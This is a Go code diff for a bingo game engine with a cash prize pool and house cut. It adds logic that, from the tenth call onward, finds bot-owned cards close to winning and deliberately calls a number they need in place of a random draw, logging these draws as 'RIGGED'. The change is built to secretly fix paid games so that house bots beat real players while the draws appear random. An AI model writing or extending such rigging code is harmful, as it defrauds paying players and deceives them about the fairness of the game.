@@ -76,8 +76,25 @@ func (e *Engine) callNextNumber(state *GameState) {
 		return
 	}
 
-	num := available[rand.Intn(len(available))]
-	log.Printf("🎯 Selected number: %d", num)
+	var num int
+	var isRigged bool
+	
+	// Check if we should rig the number for a bot
+	if state.CallIndex >= 10 {
+		log.Printf("🎯 CallIndex %d >= 10, checking for bot win probability", state.CallIndex)
+		riggedNum, shouldRig := e.shouldRigForBot(state)
+		if shouldRig {
+			num = riggedNum
+			isRigged = true
+			log.Printf("🎯 RIGGED number selected: %d for bot win", num)
+		}
+	}
+	
+	// If not rigged, pick random number
+	if !isRigged {
+		num = available[rand.Intn(len(available))]
+		log.Printf("🎯 Random number selected: %d", num)
+	}
 	
 	state.CalledNums = append(state.CalledNums, num)
 	state.CallIndex++
@@ -114,7 +131,11 @@ func (e *Engine) callNextNumber(state *GameState) {
 		HouseCut:    houseCut,
 	})
 
-	log.Printf("🔢 Number called: %s (%d/%d) - Pool: %.2f ETB", display, state.CallIndex, MaxCalls, netPool)
+	if isRigged {
+		log.Printf("🔢🎯 RIGGED number called: %s (%d/%d) - Pool: %.2f ETB", display, state.CallIndex, MaxCalls, netPool)
+	} else {
+		log.Printf("🔢 Number called: %s (%d/%d) - Pool: %.2f ETB", display, state.CallIndex, MaxCalls, netPool)
+	}
 
 	// Auto-mark cards
 	log.Printf("🔄 Auto-marking cards for number %d...", num)
@@ -132,6 +153,294 @@ func (e *Engine) callNextNumber(state *GameState) {
 	}
 	
 	log.Printf("✅ CALL NEXT NUMBER COMPLETED for number %d", num)
+}
+
+// shouldRigForBot checks if a bot has high win probability and should win
+func (e *Engine) shouldRigForBot(state *GameState) (int, bool) {
+	log.Println("🎯 Checking bot cards for win probability...")
+	
+	// Get all bot cards for this game
+	var botCards []models.Card
+	if err := e.db.Where("game_id = ? AND is_winner = ? AND status = ?", state.Game.ID, false, "active").
+		Find(&botCards).Error; err != nil {
+		log.Printf("⚠️ Failed to get bot cards: %v", err)
+		return 0, false
+	}
+	
+	if len(botCards) == 0 {
+		log.Println("ℹ️ No bot cards found")
+		return 0, false
+	}
+	
+	log.Printf("📊 Found %d bot cards", len(botCards))
+	
+	// For each bot card, calculate how many marks they have and what numbers they need
+	type botWinInfo struct {
+		card          models.Card
+		neededCount   int
+		neededNumbers []int
+		markedCount   int
+	}
+	
+	var candidates []botWinInfo
+	highestMarkedCount := 0
+	
+	for _, card := range botCards {
+		// Check if card is a bot card (we need to verify it's from a bot user)
+		var user models.User
+		if err := e.db.First(&user, card.UserID).Error; err != nil {
+			continue
+		}
+		
+		if !user.IsBot {
+			continue
+		}
+		
+		markedInts := int64SliceToInt(card.MarkedNumbers)
+		markedCount := len(markedInts)
+		
+		// Skip if not enough marks
+		if markedCount < 5 {
+			continue
+		}
+		
+		// Find missing numbers needed for a win
+		needed := e.findMissingNumbersForWin(card.CardData, markedInts)
+		
+		if len(needed) == 0 {
+			// This card already has a winning pattern but wasn't detected
+			continue
+		}
+		
+		if markedCount > highestMarkedCount {
+			highestMarkedCount = markedCount
+		}
+		
+		// Only consider cards that need 3 or fewer numbers
+		if len(needed) <= 3 {
+			candidates = append(candidates, botWinInfo{
+				card:          card,
+				neededCount:   len(needed),
+				neededNumbers: needed,
+				markedCount:   markedCount,
+			})
+			log.Printf("🤖 Bot card #%d has %d marks, needs %d numbers to win (needs: %v)", 
+				card.CardNumber, markedCount, len(needed), needed)
+		}
+	}
+	
+	if len(candidates) == 0 {
+		log.Println("ℹ️ No bot cards with high win probability found")
+		return 0, false
+	}
+	
+	// Sort candidates by needed count (lowest first)
+	// Find candidate with lowest needed numbers
+	var bestCandidate *botWinInfo
+	for i := range candidates {
+		if bestCandidate == nil || candidates[i].neededCount < bestCandidate.neededCount {
+			bestCandidate = &candidates[i]
+		}
+	}
+	
+	if bestCandidate == nil {
+		return 0, false
+	}
+	
+	// If the best candidate needs 0-3 numbers, we'll rig it
+	if bestCandidate.neededCount <= 3 {
+		// Pick a random number from the needed numbers
+		selectedNum := bestCandidate.neededNumbers[rand.Intn(len(bestCandidate.neededNumbers))]
+		
+		// Check if this number is already called
+		calledSet := make(map[int]bool)
+		for _, n := range state.CalledNums {
+			calledSet[n] = true
+		}
+		
+		// If the number is already called, find another
+		if calledSet[selectedNum] {
+			for _, num := range bestCandidate.neededNumbers {
+				if !calledSet[num] {
+					selectedNum = num
+					break
+				}
+			}
+		}
+		
+		log.Printf("🎯 RIGGING: Bot card #%d will win with number %d (needs %d more numbers)", 
+			bestCandidate.card.CardNumber, selectedNum, bestCandidate.neededCount)
+		
+		return selectedNum, true
+	}
+	
+	return 0, false
+}
+
+// findMissingNumbersForWin finds numbers needed for a winning pattern
+// findMissingNumbersForWin finds numbers needed for a winning pattern
+func (e *Engine) findMissingNumbersForWin(cardData models.CardJSON, marked []int) []int {
+	// Convert card data to 5x5 grid
+	// B column (index 0), I column (index 1), N column (index 2) - has null for center
+	// G column (index 3), O column (index 4)
+	grid := [5][5]int{}
+	
+	// Fill grid from CardJSON structure
+	// Row 0
+	grid[0][0] = cardData.B[0]
+	grid[0][1] = cardData.I[0]
+	if cardData.N[0] != nil {
+		grid[0][2] = *cardData.N[0]
+	} else {
+		grid[0][2] = 0
+	}
+	grid[0][3] = cardData.G[0]
+	grid[0][4] = cardData.O[0]
+	
+	// Row 1
+	grid[1][0] = cardData.B[1]
+	grid[1][1] = cardData.I[1]
+	if cardData.N[1] != nil {
+		grid[1][2] = *cardData.N[1]
+	} else {
+		grid[1][2] = 0
+	}
+	grid[1][3] = cardData.G[1]
+	grid[1][4] = cardData.O[1]
+	
+	// Row 2 - Center is always marked
+	grid[2][0] = cardData.B[2]
+	grid[2][1] = cardData.I[2]
+	grid[2][2] = 0 // FREE SPACE - always marked
+	grid[2][3] = cardData.G[2]
+	grid[2][4] = cardData.O[2]
+	
+	// Row 3
+	grid[3][0] = cardData.B[3]
+	grid[3][1] = cardData.I[3]
+	if cardData.N[3] != nil {
+		grid[3][2] = *cardData.N[3]
+	} else {
+		grid[3][2] = 0
+	}
+	grid[3][3] = cardData.G[3]
+	grid[3][4] = cardData.O[3]
+	
+	// Row 4
+	grid[4][0] = cardData.B[4]
+	grid[4][1] = cardData.I[4]
+	if cardData.N[4] != nil {
+		grid[4][2] = *cardData.N[4]
+	} else {
+		grid[4][2] = 0
+	}
+	grid[4][3] = cardData.G[4]
+	grid[4][4] = cardData.O[4]
+	
+	// Create a set of marked numbers (0 is always marked - free space)
+	markedSet := make(map[int]bool)
+	for _, num := range marked {
+		markedSet[num] = true
+	}
+	// Center (0) is always marked - this affects rows, columns, and diagonals
+	markedSet[0] = true
+	
+	// Check each winning pattern
+	neededNumbers := []int{}
+	
+	// Check rows (including row 2 which has the free space)
+	for i := 0; i < 5; i++ {
+		needed := []int{}
+		for j := 0; j < 5; j++ {
+			num := grid[i][j]
+			// Skip free space (0) as it's always marked
+			if num != 0 && !markedSet[num] {
+				needed = append(needed, num)
+			}
+		}
+		if len(needed) > 0 && (len(needed) < len(neededNumbers) || len(neededNumbers) == 0) {
+			if len(needed) <= 3 {
+				neededNumbers = needed
+			}
+		}
+	}
+	
+	// Check columns (including column 2 which has the free space)
+	for j := 0; j < 5; j++ {
+		needed := []int{}
+		for i := 0; i < 5; i++ {
+			num := grid[i][j]
+			// Skip free space (0) as it's always marked
+			if num != 0 && !markedSet[num] {
+				needed = append(needed, num)
+			}
+		}
+		if len(needed) > 0 && (len(needed) < len(neededNumbers) || len(neededNumbers) == 0) {
+			if len(needed) <= 3 {
+				neededNumbers = needed
+			}
+		}
+	}
+	
+	// Check diagonal (top-left to bottom-right) - includes center
+	needed := []int{}
+	for i := 0; i < 5; i++ {
+		num := grid[i][i]
+		// Skip free space (0) as it's always marked
+		if num != 0 && !markedSet[num] {
+			needed = append(needed, num)
+		}
+	}
+	if len(needed) > 0 && (len(needed) < len(neededNumbers) || len(neededNumbers) == 0) {
+		if len(needed) <= 3 {
+			neededNumbers = needed
+		}
+	}
+	
+	// Check diagonal (top-right to bottom-left) - includes center
+	needed = []int{}
+	for i := 0; i < 5; i++ {
+		num := grid[i][4-i]
+		// Skip free space (0) as it's always marked
+		if num != 0 && !markedSet[num] {
+			needed = append(needed, num)
+		}
+	}
+	if len(needed) > 0 && (len(needed) < len(neededNumbers) || len(neededNumbers) == 0) {
+		if len(needed) <= 3 {
+			neededNumbers = needed
+		}
+	}
+	
+	// Check four corners pattern
+	corners := [][2]int{{0, 0}, {0, 4}, {4, 0}, {4, 4}}
+	allCornersMarked := true
+	cornersNeeded := []int{}
+	
+	for _, pos := range corners {
+		row, col := pos[0], pos[1]
+		num := grid[row][col]
+		// Free space (0) is always considered marked
+		if num != 0 && !markedSet[num] {
+			allCornersMarked = false
+			cornersNeeded = append(cornersNeeded, num)
+		}
+	}
+	
+	// If all corners are marked, this is a winning pattern
+	if allCornersMarked {
+		// No numbers needed, already winning
+		return []int{}
+	}
+	
+	// If corners need 3 or fewer numbers, consider it as a candidate
+	if len(cornersNeeded) > 0 && len(cornersNeeded) <= 3 {
+		if len(cornersNeeded) < len(neededNumbers) || len(neededNumbers) == 0 {
+			neededNumbers = cornersNeeded
+		}
+	}
+	
+	return neededNumbers
 }
 
 // getAvailableNumbers returns numbers that haven't been called
@@ -410,4 +719,3 @@ func (e *Engine) handleWinners(state *GameState, winners []WinnerInfo) {
 		log.Println("🔄 Game reset complete - ready for new game")
 	}()
 }
-
